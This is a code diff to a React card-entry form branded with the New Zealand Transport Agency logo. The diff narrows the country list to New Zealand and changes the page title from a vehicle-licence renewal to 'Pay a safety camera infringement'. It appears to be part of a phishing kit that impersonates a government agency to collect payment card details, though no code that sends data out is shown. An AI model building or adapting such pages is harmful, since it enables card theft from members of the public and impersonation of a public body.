@@ -5,83 +5,7 @@ import nztaLogo from '../assets/nzta-logo.png';
 
 // ─── Country codes (named export — LoginForm.js needs this) ───
 export const countryCodes = [
-  { code: '+213', country: 'Algeria (DZ)', phoneLength: 9, zipLength: 5 },
-  { code: '+54', country: 'Argentina (AR)', phoneLength: 10, zipLength: 4 },
-  { code: '+61', country: 'Australia (AU)', phoneLength: 9, zipLength: 4 },
-  { code: '+43', country: 'Austria (AT)', phoneLength: 10, zipLength: 4 },
-  { code: '+973', country: 'Bahrain (BH)', phoneLength: 8, zipLength: 4 },
-  { code: '+880', country: 'Bangladesh (BD)', phoneLength: 10, zipLength: 4 },
-  { code: '+375', country: 'Belarus (BY)', phoneLength: 9, zipLength: 6 },
-  { code: '+32', country: 'Belgium (BE)', phoneLength: 9, zipLength: 4 },
-  { code: '+55', country: 'Brazil (BR)', phoneLength: 11, zipLength: 8 },
-  { code: '+359', country: 'Bulgaria (BG)', phoneLength: 9, zipLength: 4 },
-  { code: '+855', country: 'Cambodia (KH)', phoneLength: 9, zipLength: 5 },
-  { code: '+1', country: 'Canada/US (CA/US)', phoneLength: 10, zipLength: 5 },
-  { code: '+56', country: 'Chile (CL)', phoneLength: 9, zipLength: 7 },
-  { code: '+86', country: 'China (CN)', phoneLength: 11, zipLength: 6 },
-  { code: '+57', country: 'Colombia (CO)', phoneLength: 10, zipLength: 6 },
-  { code: '+385', country: 'Croatia (HR)', phoneLength: 9, zipLength: 5 },
-  { code: '+420', country: 'Czech Republic (CZ)', phoneLength: 9, zipLength: 5 },
-  { code: '+45', country: 'Denmark (DK)', phoneLength: 8, zipLength: 4 },
-  { code: '+20', country: 'Egypt (EG)', phoneLength: 10, zipLength: 5 },
-  { code: '+372', country: 'Estonia (EE)', phoneLength: 8, zipLength: 5 },
-  { code: '+358', country: 'Finland (FI)', phoneLength: 9, zipLength: 5 },
-  { code: '+33', country: 'France (FR)', phoneLength: 9, zipLength: 5 },
-  { code: '+49', country: 'Germany (DE)', phoneLength: 11, zipLength: 5 },
-  { code: '+233', country: 'Ghana (GH)', phoneLength: 9, zipLength: 5 },
-  { code: '+30', country: 'Greece (GR)', phoneLength: 10, zipLength: 5 },
-  { code: '+852', country: 'Hong Kong (HK)', phoneLength: 8, zipLength: 0 },
-  { code: '+36', country: 'Hungary (HU)', phoneLength: 9, zipLength: 4 },
-  { code: '+91', country: 'India (IN)', phoneLength: 10, zipLength: 6 },
-  { code: '+62', country: 'Indonesia (ID)', phoneLength: 10, zipLength: 5 },
-  { code: '+353', country: 'Ireland (IE)', phoneLength: 9, zipLength: 0 },
-  { code: '+972', country: 'Israel (IL)', phoneLength: 9, zipLength: 7 },
-  { code: '+39', country: 'Italy (IT)', phoneLength: 10, zipLength: 5 },
-  { code: '+225', country: 'Ivory Coast (CI)', phoneLength: 10, zipLength: 5 },
-  { code: '+81', country: 'Japan (JP)', phoneLength: 10, zipLength: 7 },
-  { code: '+254', country: 'Kenya (KE)', phoneLength: 9, zipLength: 5 },
-  { code: '+965', country: 'Kuwait (KW)', phoneLength: 8, zipLength: 5 },
-  { code: '+856', country: 'Laos (LA)', phoneLength: 10, zipLength: 5 },
-  { code: '+371', country: 'Latvia (LV)', phoneLength: 8, zipLength: 4 },
-  { code: '+370', country: 'Lithuania (LT)', phoneLength: 8, zipLength: 5 },
-  { code: '+60', country: 'Malaysia (MY)', phoneLength: 9, zipLength: 5 },
-  { code: '+52', country: 'Mexico (MX)', phoneLength: 10, zipLength: 5 },
-  { code: '+976', country: 'Mongolia (MN)', phoneLength: 8, zipLength: 5 },
-  { code: '+212', country: 'Morocco (MA)', phoneLength: 9, zipLength: 5 },
-  { code: '+95', country: 'Myanmar (MM)', phoneLength: 9, zipLength: 5 },
-  { code: '+977', country: 'Nepal (NP)', phoneLength: 10, zipLength: 5 },
-  { code: '+31', country: 'Netherlands (NL)', phoneLength: 9, zipLength: 6 },
   { code: '+64', country: 'New Zealand (NZ)', phoneLength: 9, zipLength: 4 },
-  { code: '+234', country: 'Nigeria (NG)', phoneLength: 10, zipLength: 6 },
-  { code: '+47', country: 'Norway (NO)', phoneLength: 8, zipLength: 4 },
-  { code: '+968', country: 'Oman (OM)', phoneLength: 8, zipLength: 3 },
-  { code: '+92', country: 'Pakistan (PK)', phoneLength: 10, zipLength: 5 },
-  { code: '+51', country: 'Peru (PE)', phoneLength: 9, zipLength: 5 },
-  { code: '+63', country: 'Philippines (PH)', phoneLength: 10, zipLength: 4 },
-  { code: '+48', country: 'Poland (PL)', phoneLength: 9, zipLength: 5 },
-  { code: '+351', country: 'Portugal (PT)', phoneLength: 9, zipLength: 7 },
-  { code: '+974', country: 'Qatar (QA)', phoneLength: 8, zipLength: 0 },
-  { code: '+40', country: 'Romania (RO)', phoneLength: 9, zipLength: 6 },
-  { code: '+7', country: 'Russia (RU)', phoneLength: 10, zipLength: 6 },
-  { code: '+966', country: 'Saudi Arabia (SA)', phoneLength: 9, zipLength: 5 },
-  { code: '+381', country: 'Serbia (RS)', phoneLength: 9, zipLength: 5 },
-  { code: '+65', country: 'Singapore (SG)', phoneLength: 8, zipLength: 6 },
-  { code: '+421', country: 'Slovakia (SK)', phoneLength: 9, zipLength: 5 },
-  { code: '+386', country: 'Slovenia (SI)', phoneLength: 8, zipLength: 4 },
-  { code: '+27', country: 'South Africa (ZA)', phoneLength: 9, zipLength: 4 },
-  { code: '+82', country: 'South Korea (KR)', phoneLength: 10, zipLength: 5 },
-  { code: '+34', country: 'Spain (ES)', phoneLength: 9, zipLength: 5 },
-  { code: '+94', country: 'Sri Lanka (LK)', phoneLength: 9, zipLength: 5 },
-  { code: '+46', country: 'Sweden (SE)', phoneLength: 9, zipLength: 5 },
-  { code: '+41', country: 'Switzerland (CH)', phoneLength: 9, zipLength: 4 },
-  { code: '+886', country: 'Taiwan (TW)', phoneLength: 9, zipLength: 5 },
-  { code: '+66', country: 'Thailand (TH)', phoneLength: 9, zipLength: 5 },
-  { code: '+216', country: 'Tunisia (TN)', phoneLength: 8, zipLength: 4 },
-  { code: '+90', country: 'Turkey (TR)', phoneLength: 10, zipLength: 5 },
-  { code: '+380', country: 'Ukraine (UA)', phoneLength: 9, zipLength: 5 },
-  { code: '+971', country: 'United Arab Emirates (AE)', phoneLength: 9, zipLength: 0 },
-  { code: '+44', country: 'United Kingdom (UK)', phoneLength: 10, zipLength: 7 },
-  { code: '+84', country: 'Vietnam (VN)', phoneLength: 9, zipLength: 6 },
 ];
 
 const months = Array.from({ length: 12 }, (_, i) => {
@@ -131,10 +55,7 @@ function CardVerificationForm({ cardDetails, cardErrors, isLoading, onInputChang
               className="nzta-logo-img"
             />
           </div>
-          <div className="nzta-services-tab">
-            
-            <span>Online Services</span>
-          </div>
+          
         </div>
       </header>
 
@@ -144,23 +65,10 @@ function CardVerificationForm({ cardDetails, cardErrors, isLoading, onInputChang
           ← Back
         </a>
 
-        <h1 className="nzta-title">Renew your vehicle licence (rego)</h1>
+        <h1 className="nzta-title">Pay a safety camera infringement
+</h1>
 
-        {/* Steps — 3 steps, step 2 active */}
-        <ol className="nzta-steps">
-          <li className="nzta-step done">
-            <span className="nzta-step-circle">1</span>
-            <span className="nzta-step-label">Enter vehicle details</span>
-          </li>
-          <li className="nzta-step active">
-            <span className="nzta-step-circle">2</span>
-            <span className="nzta-step-label">Payment details</span>
-          </li>
-          <li className="nzta-step">
-            <span className="nzta-step-circle">3</span>
-            <span className="nzta-step-label">Confirmation</span>
-          </li>
-        </ol>
+        
 
         <hr className="nzta-divider" />
 
